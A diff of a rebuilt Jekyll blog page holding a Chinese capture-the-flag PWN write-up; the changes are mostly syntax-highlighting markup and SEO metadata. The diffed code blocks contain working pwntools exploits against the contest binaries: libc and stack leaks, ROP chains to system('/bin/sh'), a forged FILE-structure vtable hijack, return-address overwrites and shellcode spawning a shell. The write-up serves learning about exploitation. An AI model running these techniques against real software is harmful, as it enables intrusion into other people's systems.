@@ -16,21 +16,22 @@
         document.documentElement.setAttribute('data-theme', 'light');
       }
     })();
-  </script><!-- Begin Jekyll SEO tag v2.8.0 -->
+  </script><!-- Begin Jekyll SEO tag v2.9.0 -->
 <title>西湖论剑 2025 PWN Writeup | Y²的博客</title>
-<meta name="generator" content="Jekyll v3.10.0" />
+<meta name="generator" content="Jekyll v4.4.1" />
 <meta property="og:title" content="西湖论剑 2025 PWN Writeup" />
 <meta name="author" content="Y² (aka.cameudis)" />
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="babytrace" />
-<meta property="og:description" content="babytrace" />
+<meta name="twitter:description" property="og:description" content="babytrace" />
 <link rel="canonical" href="https://www.cameudis.com/2025/01/20/XHLJ-2025.html" />
 <meta property="og:url" content="https://www.cameudis.com/2025/01/20/XHLJ-2025.html" />
 <meta property="og:site_name" content="Y²的博客" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2025-01-20T00:00:00+08:00" />
+<meta property="article:modified_time" content="2025-01-20T00:00:00+08:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="西湖论剑 2025 PWN Writeup" />
+<meta name="twitter:title" content="西湖论剑 2025 PWN Writeup" />
 <script type="application/ld+json">
 {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Y² (aka.cameudis)"},"dateModified":"2025-01-20T00:00:00+08:00","datePublished":"2025-01-20T00:00:00+08:00","description":"babytrace","headline":"西湖论剑 2025 PWN Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cameudis.com/2025/01/20/XHLJ-2025.html"},"url":"https://www.cameudis.com/2025/01/20/XHLJ-2025.html"}</script>
 <!-- End Jekyll SEO tag -->
@@ -699,36 +700,36 @@ call qword ptr [rax + 0x28];
     <span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x4da83</span>
 
 	<span class="c1"># leak libc
-</span>    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'one &gt;'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'which one?'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">bias_base</span><span class="o">+</span><span class="mi">37</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
-    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">' = '</span><span class="p">)</span>
-    <span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">),</span> <span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">libc_start_main_return</span>
-    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'libc_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+</span>    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">one &gt;</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">which one?</span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">bias_base</span><span class="o">+</span><span class="mi">37</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s"> = </span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">),</span> <span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">libc_start_main_return</span>
+    <span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">libc_base: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
 
 	<span class="c1"># leak stack
-</span>    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'one &gt;'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'which one?'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'-4'</span><span class="p">)</span>
-    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">' = '</span><span class="p">)</span>
-    <span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">),</span> <span class="mi">10</span><span class="p">)</span>
+</span>    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">one &gt;</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">which one?</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">-4</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s"> = </span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">stack</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">),</span> <span class="mi">10</span><span class="p">)</span>
     <span class="nb">buffer</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">-</span> <span class="mh">0x30</span> <span class="o">-</span> <span class="mh">0x220</span>
     <span class="n">array_base</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">-</span> <span class="mh">0x20</span>
-    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
-    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'buffer: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
-    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'array_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">array_base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">stack: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">buffer: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">array_base: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">array_base</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
 
-    <span class="n">rop_chain</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+    <span class="n">rop_chain</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">([</span>
         <span class="mh">0xdeadbeef</span><span class="p">,</span>
         <span class="n">libc_base</span> <span class="o">+</span> <span class="n">int1</span><span class="p">,</span>
         <span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rdi</span><span class="p">,</span>
-        <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">)),</span>
-        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">],</span>
+        <span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">)),</span>
+        <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">],</span>
         <span class="mh">0x0</span><span class="p">,</span>
     <span class="p">])</span>
 
     <span class="n">null_ptr</span> <span class="o">=</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="mh">0x28</span>
-    <span class="n">fs_addr</span> <span class="o">=</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop_chain</span><span class="p">)</span> <span class="c1"># pos of the fake FS
+    <span class="n">fs_addr</span> <span class="o">=</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="nf">len</span><span class="p">(</span><span class="n">rop_chain</span><span class="p">)</span> <span class="c1"># pos of the fake FS
 </span>
-    <span class="n">fs</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+    <span class="n">fs</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">({</span>
         <span class="mh">0x00</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># flags
 </span>        <span class="mh">0x08</span><span class="p">:</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rbp</span><span class="p">,</span> <span class="c1"># _IO_read_ptr
 </span>        <span class="mh">0x10</span><span class="p">:</span> <span class="nb">buffer</span><span class="p">,</span> <span class="c1"># _IO_read_end
@@ -736,16 +737,16 @@ call qword ptr [rax + 0x28];
 </span>        <span class="mh">0x88</span><span class="p">:</span> <span class="n">null_ptr</span><span class="p">,</span> <span class="c1"># _lock
 </span>        <span class="mh">0xa0</span><span class="p">:</span> <span class="n">fs_addr</span> <span class="o">+</span> <span class="mh">0xf0</span> <span class="o">-</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="c1"># _wide_data
 </span>        <span class="mh">0xa8</span><span class="p">:</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">leave_ret</span><span class="p">,</span>
-        <span class="mh">0xd8</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'_IO_wfile_jumps'</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x18</span> <span class="o">-</span> <span class="mh">0x38</span><span class="p">,</span> <span class="c1"># vtable
+        <span class="mh">0xd8</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_wfile_jumps</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x18</span> <span class="o">-</span> <span class="mh">0x38</span><span class="p">,</span> <span class="c1"># vtable
 </span>        <span class="mh">0xf0</span><span class="p">:</span> <span class="n">fs_addr</span> <span class="o">+</span> <span class="mh">0xa8</span> <span class="o">-</span> <span class="mh">0x68</span><span class="p">,</span>
     <span class="p">})</span>
 
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'one &gt;'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
-    <span class="n">sa</span><span class="p">(</span><span class="sa">b</span><span class="s">'recv:'</span><span class="p">,</span> <span class="n">rop_chain</span> <span class="o">+</span> <span class="n">fs</span><span class="p">)</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'which one?'</span><span class="p">,</span> <span class="nb">str</span><span class="p">((</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'stdout'</span><span class="p">]</span><span class="o">-</span><span class="n">array_base</span><span class="p">)</span><span class="o">//</span><span class="mi">8</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'value?'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">fs_addr</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">one &gt;</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">recv:</span><span class="sh">'</span><span class="p">,</span> <span class="n">rop_chain</span> <span class="o">+</span> <span class="n">fs</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">which one?</span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">((</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">stdout</span><span class="sh">'</span><span class="p">]</span><span class="o">-</span><span class="n">array_base</span><span class="p">)</span><span class="o">//</span><span class="mi">8</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">value?</span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">fs_addr</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
 
-    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
@@ -770,59 +771,59 @@ call qword ptr [rax + 0x28];
 
 <p>在 6 次 Push 后，第七和第八次 push 即可覆盖 length，而后就可以通过 print 泄露栈上的各种数据，并用 edit 编辑返回地址，打 ROP。</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span>      <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
-<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
-<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">r</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span>      <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span>   <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">s</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span>     <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'choice: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'index'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'value: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">choice: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">index</span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">value: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">push</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'choice: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'value'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">choice: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">pop</span><span class="p">():</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'choice: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">choice: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">printv</span><span class="p">():</span>
-    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">'choice: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'4'</span><span class="p">)</span>
+    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">choice: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
-        <span class="n">push</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
-    <span class="n">push</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
-    <span class="n">printv</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+        <span class="nf">push</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+    <span class="nf">push</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+    <span class="nf">printv</span><span class="p">()</span>
 
-    <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">'contents: '</span><span class="p">)</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">18</span><span class="p">):</span>
-        <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">' '</span><span class="p">)</span>
+    <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">contents: </span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">18</span><span class="p">):</span>
+        <span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">)</span>
 
-    <span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">' '</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">())</span> <span class="o">+</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s">' '</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">())</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">libc_start_main_return</span>
-    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'libc_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">decode</span><span class="p">())</span> <span class="o">+</span> <span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">decode</span><span class="p">())</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">libc_start_main_return</span>
+    <span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">libc_base: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
 
     <span class="c1">#one_gadget = libc_base + 0xebd43
 </span>    <span class="c1">#info(f'one_gadget: {hex(one_gadget)}')
 </span>
     <span class="n">ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000029139</span>
     <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000002a3e5</span>
-    <span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>
-    <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+    <span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">))</span>
+    <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
 
-    <span class="n">edit</span><span class="p">(</span><span class="mi">18</span><span class="p">,</span> <span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
-    <span class="n">edit</span><span class="p">(</span><span class="mi">19</span><span class="p">,</span> <span class="n">ret</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span>
-    <span class="n">edit</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="n">pop_rdi</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
-    <span class="n">edit</span><span class="p">(</span><span class="mi">21</span><span class="p">,</span> <span class="n">pop_rdi</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span>
-    <span class="n">edit</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span> <span class="n">binsh</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
-    <span class="n">edit</span><span class="p">(</span><span class="mi">23</span><span class="p">,</span> <span class="n">binsh</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span>
-    <span class="n">edit</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
-    <span class="n">edit</span><span class="p">(</span><span class="mi">25</span><span class="p">,</span> <span class="n">system</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span>
+    <span class="nf">edit</span><span class="p">(</span><span class="mi">18</span><span class="p">,</span> <span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+    <span class="nf">edit</span><span class="p">(</span><span class="mi">19</span><span class="p">,</span> <span class="n">ret</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span>
+    <span class="nf">edit</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="n">pop_rdi</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+    <span class="nf">edit</span><span class="p">(</span><span class="mi">21</span><span class="p">,</span> <span class="n">pop_rdi</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span>
+    <span class="nf">edit</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span> <span class="n">binsh</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+    <span class="nf">edit</span><span class="p">(</span><span class="mi">23</span><span class="p">,</span> <span class="n">binsh</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span>
+    <span class="nf">edit</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+    <span class="nf">edit</span><span class="p">(</span><span class="mi">25</span><span class="p">,</span> <span class="n">system</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span>
 
-    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
@@ -831,7 +832,7 @@ call qword ptr [rax + 0x28];
 <p>神秘。</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
-	<span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s">"puchid:"</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">()))</span>
